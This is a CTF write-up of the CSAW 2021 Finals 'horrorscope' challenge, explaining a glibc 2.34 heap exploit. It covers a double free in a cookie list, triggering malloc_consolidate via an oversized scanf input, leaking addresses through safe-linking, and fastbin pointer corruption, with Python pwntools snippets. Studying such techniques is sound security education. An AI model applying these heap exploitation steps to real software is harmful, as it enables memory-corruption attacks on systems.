---
title:      CSAW CTF 2021 Finals - horrorscope
author:     Tito Sacchi
date:       2021-12-22 14:17:00
summary:    Fighting against libc to consolidate fastbins
categories: CSAW2021 Exploitable
tags:
 - CSAW
 - Exploitable
 - Heap

---

# horrorscope (CSAW CTF 2021 Finals)

I worked on this challenge as an exercise after those from our team who
participated in the CTF told me that it would be a nice journey through unusual
glibc malloc internals. I found this heap exploitation challenge quite difficult
because at first glance I had no idea how to solve it; it really took me some
time to discover that in some cases glibc consolidates fastbin chunks. Even
after that, I had a hard time figuring out how to use this to write the exploit
-- the final script was unnecessarily complex and performed two different
consolidations. I'm going to explain a simpler and cleaner version that I put up
while writing the writeup. I will give detailed explanations only of the
functions and memory structures that are more relevant for the exploit.

Files: [horrorscope]({{ site.url }}/writeups_files/horrorscope/horrorscope),
[Dockerfile]({{ site.url }}/writeups_files/horrorscope/Dockerfile)


## Step 0: setup

The challenge uses a very recent glibc (2.34) and runs on Ubuntu 21.10. The
provided Dockerfile used xinetd and configuration files were missing, so I
replaced it with socat and launched the challenge with docker-compose.

Unfortunately even after installing `libc6-dbg` in the container, debug symbols
weren't loaded in GDB and I couldn't use pwngdb heap commands. I got debugging
symbols to work while cleaning up the exploit by copying the entire
`/usr/lib/debug` directory from the container to the host and passing `set
debug-file-directory ...` to GDB.

## Step 1: looking for vulnerabilities

```
❯ pwn checksec ./horrorscope
[*] '/home/tito/csaw/horrorscope/horrorscope'
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

❯ ./ld-linux-x86-64.so.2 --preload ./libc-2.34.so ./horrorscope

Welcome to the CSAW Oracle (v2.34)!!
We offer all manners of predicting your future and fate!
If you're lucky, that fate will include reading the ./flag.txt!!


 -----------------------------------------
 Option 0: Query horoscope sign birthdates
 Option 1: Ask the Magic 8 Ball a question
 Option 2: Open a fortune cookie
 Option 3: Read a saved 8 ball fortune
 Option 4: Read a saved cookie fortune
 Option 5: Delete a saved 8 ball fortune
 Option 6: Visit the Oracle
 Option 7: Get Lucky Number
 Option 8: Save Lucky Number
 Option 9: Exit
 >
```

Ok, every protection is enabled. Let's have a look at the different
functions that the binary presents us at the menu.

**Option 0**: the function is called `sign` in the binary. It checks whether a
global variable (`globals`) is `NULL` and allocates a buffer of size 0x10 with
`calloc` if it is. Then it lets us write 16 bytes in the buffer pointed by the
global variable.

**Option 1**: the function is called `ask_8ball`. It allocates with `malloc` a
buffer of size 0x70 and asks the user for input. The input is not stored
directly at the beginning of the allocated buffer but at `buffer + 17` instead,
because it gets prepended the string `Oh Magic 8 Ball, `. It then outputs some
useless string (the fortune) depending on out input, and then asks us whether we
want to save the fortune. If the answer is `N`, it frees the chunk; otherwise,
it appends a struct to global array (called `f`) in `.bss`. The struct is
constructed as follows:

```c
struct magic_ball_fortune {
    char* user_string;
    char response[32];
}
```

`user_string` holds a pointer to the buffer that was dynamically allocated
before, containing `Oh Magic 8 Ball, ` followed by our input. We can store at
most 10 8-ball fortunes (`f` is 400 bytes long) and read them later on with
option 3.

**Option 2**: this is `get_cookie` and it's where the main vulnerability lies,
as we will see later. We can ask for a fortune cookie and this will be read from
a file (`./cookies.txt`). A random line will be chosen from that file and will
be placed in a 0x70-sized buffer allocated with `calloc`. A pointer to the
resulting buffer is appended to some kind of singly-linked list stored at the
symbol `c`, in `.bss`. The last quadword of the buffer then contains a pointer
that points back to the linked list entry in `.bss`:

```c
struct cookie_fortune { /* size = 0x70 */
    char fortune[0x68];
    linked_list_entry* my_entry;
}
```

Each entry in the global array `c` (as in `cookies`) is composed of two quadwords:
```c
struct linked_list_entry { /* size = 0x10 */
    cookie_fortune* bck;
    cookie_fortune* this;
}
```

A memory dump is worth a thousand words:
```
pwndbg> x/20gx &c
#                    (bck)               (this)
0x55555555a0a0 c:    0x0000000000000000  0x000055555555b380 (cookie 0)
0x55555555a0b0 c+16: 0x000055555555b380  0x000055555555b400 (cookie 1)
0x55555555a0c0 c+32: 0x000055555555b400  0x000055555555b480 (cookie 2)
0x55555555a0d0 c+48: 0x000055555555b480  0x000055555555b500 (cookie 3)
0x55555555a0e0 c+64: 0x000055555555b500  0x000055555555b580 (cookie 4)
0x55555555a0f0 c+80: 0x0000000000000000  0x0000000000000000

pwndbg> x/20gx 0x000055555555b380
0x55555555b380: 0x0000000000003232  0x0000000000000000  ⎤
0x55555555b390: 0x0000000000000000  0x0000000000000000  ⎥
0x55555555b3a0: 0x0000000000000000  0x0000000000000000  ⎥ buffer
0x55555555b3b0: 0x0000000000000000  0x0000000000000000  ⎥
0x55555555b3c0: 0x0000000000000000  0x0000000000000000  ⎥
0x55555555b3d0: 0x0000000000000000  0x0000000000000000  ⎦
0x55555555b3e0: 0x0000000000000000  0x000055555555a0a0
                                    ┗━━→ points back to the entry in c
```

We can store at most 33 cookies in `c`, and if we ask for a fortune cookie when
the list is full, `delete_cookie` is called. This function is quite hard to
read, mainly because there are some instructions that reference the address
`c+8` directly and this confuses IDA. We can choose which cookie we want to free
and then the functions performs some integrity checks on the linked list.
Assuming `idx` (in the range `0..32`) is the cookie to delete, it basically
checks the invariants `c[idx].this->my_entry == &c[idx]`, `c[idx+1].bck ==
c[idx].this`, `c[idx].bck == c[idx-1].this`, `c[idx].bck != c[idx].this`.

Then, `delete_cookie` `free()`s the `cookie_fortune` at `c[idx].this` and then
shifts all the entries in the range `(idx+1)..32` backwards by 1 in `c`. It does
so with an complex while loop with some special cases for cookie 0 and cookie
32. However, it has a serious flaw: it does not overwrite `c[idx].this`! This is
the main vulnerability that will allow us to have a double free.

Let me explain in more detail. Consider the memory dump above, and suppose we
went on filling the list until the end. After `delete_cookie()` has deleted
cookie 4, for example, `c` will contain:

```
pwndbg> x/20gx &c
0x55555555a0a0 c:    0x0000000000000000  0x000055555555b380 (cookie 0)
0x55555555a0b0 c+16: 0x000055555555b380  0x000055555555b400 (cookie 1)
0x55555555a0c0 c+32: 0x000055555555b400  0x000055555555b480 ...
0x55555555a0d0 c+48: 0x000055555555b480  0x000055555555b500
0x55555555a0e0 c+64: 0x000055555555b500  0x000055555555b580 | !!!
0x55555555a0f0 c+80: 0x000055555555b600  0x000055555555b680
0x55555555a100 c+96: 0x000055555555b680  0x000055555555b700
...
```

As you can see, `delete_cookie` shifted cookies  in the range `5..32` back by 1
position, but it did not update `c[4].this` and it is still pointing at the
freed buffer!

Note that `delete_cookie` is corrupting its own list, but it also performs
integrity checks as I explained above: this means that if we free cookie 1, we
won't be able to free cookies 1 or 2 in a later stage, because corruption will
be detected. Cookie 32 (the last one) is an exception, because there is no
cookie 33 to check the invariant `c[idx].this == c[idx+1].bck`!

**Option 3**: Ok, the hardest part of the analysis is done.
`print_8ball_fortune` allows the user to read one of the 8-ball fortunes that
was saved before with option 2. It gets the buffer address from `f` and prints
both the user input and the magic ball response.

**Option 4**: `print_cookie_fortune` prints the content of one of the cookies
stored in `c` chosen by the user. It prints the buffer stored at `c[idx].this`.

**Option 5**: this function (`delete_8ball_fortune`) can be used to free the
last 8-ball fortune that has been saved with option 2. We cannot choose which of
the fortunes stored in `f` to delete -- we can only delete the one at the end.

**Option 6**: this function prints a random line from another file
(`./oracle.txt`). It allocates a very big chunk with `malloc` (size 0x390) to
read the file contents. We will use this function in the final stage of the
exploit.

**Option 7**: `get_lucky_num`, similarly to `sign`, uses a global variable to
store a pointer to a buffer (the symbol is called `buf`). If it is `NULL`, it
allocates a buffer of size 0x10 with `calloc` and asks the user for his name
that will be stored there. It then outputs some useless value. If called another
time, it won't ask for input again, because `buf` still holds the pointer to the
user's previous input and is not `NULL` anymore.

**Option 8**: `store_lucky_num` unintuitively does not share any global state
with `get_lucky_num`. The generated pseudocode is very easy to read: it uses a
global variable (`ptr`) to store a pointer to the user's "lucky number", a
buffer of size 8 allocated with `calloc`. We can delete our lucky number
(`free()` the buffer), create it again (`calloc()`) and update it (change the
contents of the buffer pointed by `ptr`) how many times we want.


## Step 2: planning the exploit

This really took some time and commitment! We only have `malloc()`s, `calloc()`s
and `free()`s of fixed sizes. We can perform a double free on cookie 32 because
it is the only case `delete_cookie` won't corrupt the list. However, we have no
way to edit the forward pointer in the chunk before we free it again, because
option 1 (`ask_8ball`) writes `Oh Magic 8 Ball, ` (17 bytes) in the buffer right
before our input, and other functions don't allocate chunks of the same size as
`get_cookie`.

I spent a few hours looking at the pseudocode without any idea. I thought that
if I could consolidate the fastbin chunks maybe I could find a way to corrupt
the chunk pointers; however, someone taught me that fastbins get _never_
consolidated... But while reading the glibc sources in total despair, I
discovered that there is a specific function inside `malloc.c` that does exactly
this: `malloc_consolidate`. `call malloc_consolidate(&main_arena)` in GDB did
exactly what I expected.

I had to find a way to trigger the call to `malloc_consolidate()` -- it occurs
quite rarely in the ptmalloc allocator. It turned out that the easiest way to do
that is to issue a largebin-sized allocation request to `malloc()`: see
[`malloc/malloc.c`:3852 in glibc 2.34](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e065785af77af72c17c773517c15b248b067b4ad;hb=ae37d06c7d127817ba43850f0f898b793d42aea7#l3837).

However we have no control over the size of the chunks allocated by the
application and the largest one is smallbin-sized (`malloc(0x390)` in `oracle`).
How can we `malloc()` more than 0x400?

Well, this is the trick that I came up with: some internal libc functions use
`malloc` and `free` internally, and `scanf` is one of them. And... the
application is reading the user's choices at the menu using `scanf()`! So
sending a very large payload at the menu could trigger `malloc_consolidate()`. I
was right: sending 1024 `'5'`s successfully consolidated the fastbins.


## Step 3: implementing the exploit

The main idea is the following: we will allocate a cookie with
`create_cookie()`, free it and then consolidate it with the top chunk. Then we
will allocate a buffer of size 0x10 with `store_lucky_num()` right on the top
chunk and it will end up exactly where the buffer of the just freed
`cookie_fortune` was. We will free this buffer with `delete_cookie()` because of
the bug explained above; we will still be able to edit its contents with
`store_lucky_num()` and we will use that corrupt the fastbin forward pointer.

We will use fastbin corruption to overwrite an address stored at `.data + 0x30`
that points to the string `"./oracle.txt"`. This address is passed as a
parameter to `open()` in `oracle` (option 6). I mean, why would you want to put
a pointer to a static string in a R/W memory segment? It's surely meant to be
pwned! We will overwrite this pointer with the address of `"./flag.txt"`.
Choosing option 6 will print a random line from `./flag.txt`!

I will comment [the exploit]({{ site.url }}/writeups_files/horrorscope/exploit.py)
step by step (omitting utility functions for brevity).

Firstly we fill the tcache for chunks of size 0x20, because the only chunk we
will free of size 0x20 will be the lucky number created on the top chunk, and we
want it to end up in fastbins. To fill the tcache we repeatedly create and
delete 0x20-sized chunks with `calloc()` because it does not use the tcache and
each call to `free()` will add one chunk on the tcachebin.

```python
for i in range(7): # tcachebins contain at most 7 chunks
    # Will call store_lucky_num(), the content is not important
    create_lucky_number()
    delete_lucky_number()
```

Then, we want to fill the cookie fortune linked list (`c`) because we can only
free cookie fortunes when the list is full (33 elements).

```python
for i in range(33):
    create_cookie()
```

Now we will fill the tcachebin for size 0x80 in the exact same way as above:
`create_cookie()` uses `calloc()` internally. Note that we can't just free
cookies 0, 1, 2, ... because list corruption will be detected, so we free
cookies 1, 3, 5, ...

```python
for i in range(7):
    delete_cookie(2*i + 1)
    create_cookie()
```

We will get a leak of the heap base address by reading inside the first
`free()`d cookie fortune, which is the last one in the appropriate tcachebin. We
will abuse the 'safe linking' pointer masking machenism introduces in glibc
2.32. Its forward pointer is `NULL`. With safe linking, this is stored as `NULL
^ (cookie_addr >> 12) = cookie_addr >> 12`: reading the cookie yields the base
address of the memory page where this chunk resides.

```
                   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
cookie_addr - 0x10 ┃ ...                       ┃ size | prev_inuse:   0x81 ┃
                   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
cookie_addr        ┃ fwd ^ (cookie_addr >> 12) ┃ ...                       ┃
                   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
cookie_addr + 0x10 ┃ ...                                                   ┃
                   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
```

```python
def read_heap_leak(idx):
    r.sendline(b'4')
    r.recvuntil(b'Please enter a fortune index\n > ')
    r.sendline(str(idx).encode())
    r.recvuntil(b' ')
    s = r.recv(5) + b'\x00\x00\x00'
    r.recvuntil(b'-----------------------------------------')
    return u64(s) * 4096
heap_base = read_heap_leak(1)
```

We also need a leak of the program load address, because it is PIE and we will
need this leak to know where `.data` is in memory. Remember that each `struct
cookie_fortune` contains a pointer to its own entry in `c`: `free()`d cookie
fortune buffers still contain it. We will allocate a 0x70-sized buffer with
`ask_8ball` where there was a `cookie_fortune` and we will fill the chunk until
offset 0x68. When printing it, we will receive 0x68 bytes (our input) followed
by the address of an entry in `c`.

```python
# Will pick up first available chunk in the tcachebin, i.e. cookie 13
create_ball(b'A' * (0x68 - 17 - 1))
section_data_address = read_binary_leak(13) - 0x170
```

Now we will allocate a `cookie_fortune` from the top chunk, free it and
immediately consolidate that with the top chunk with the `scanf()` trick
explained above.

```python
delete_cookie(15) # Fills up the tcache again
create_cookie()   # Ends up in the top chunk
delete_cookie(32) # Ends up in fastbins
r.sendline(b'5' * 0x400)
r.recvuntil(b'-----------------------------------------')
```

We empty the tcachebin for size 0x80 because we will need to allocate 8-ball
user input buffers from the top chunk. The first buffer allocated now from the
tcache will be at offset 0xe80 from the heap base.

```python
for i in range(7):
    create_ball(b"./flag.txt\x00")
# +17 because "Oh Magic 8 Ball, " prepended to our input
flag_txt = heap_base + 0xe80 + 17
```

We finally allocate our 0x10 user input buffer with `store_lucky_num()` where
`c[32].this` is still pointing. The 8-ball buffer allocated right after that is
used to fix `c[32].this->my_entry`: otherwise `delete_cookie` will detect
corruption. `c[32].this->my_entry` should point at `&c[32]`, i.e. `c + 32 *
0x10`, i.e. `section_data_address + 0xA0 + 32 * 0x10`.

```python
create_lucky_number() # Ends up at c[32].this
create_ball(fit({
    0x68 - 0x20 - 17: p64(section_data_address + 0xA0 + 32 * 0x10)
}))
```

Now we free cookie 32 and corrupt its forward pointer. We want the next chunk to
start at `.data + 0x30`, where the pointer to `"./oracle.txt"` is stored.
Therefore, accounting for chunk metadata, the fastbin forward pointer must point
at `.data + 0x20`. We have to apply the safe linking mask. We are lucky enough
not to have any alignment issues with this address, because `.data + 0x28`
contains the quadword `0x21` that matches exactly the size of our chunks.

```python
delete_cookie(32)
protect_mask = (heap_base >> 12) + 1
update_lucky_number(p64(protect_mask ^ (section_data_address + 0x20)))
```

We still have to consume one fastbin still with `get_lucky_num` and then we will
overwrite the target pointer without messing up the next quadword.

```python
get_lucky()
sign(p64(flag_txt) + b'\x0b')
```

Now if you choose option 6 for a few times at the menu you will read a random
line from `./flag.txt`!

Many thanks to Gabriele Digregorio and to Lorenzo Binosi who wrote the exploit
with me!
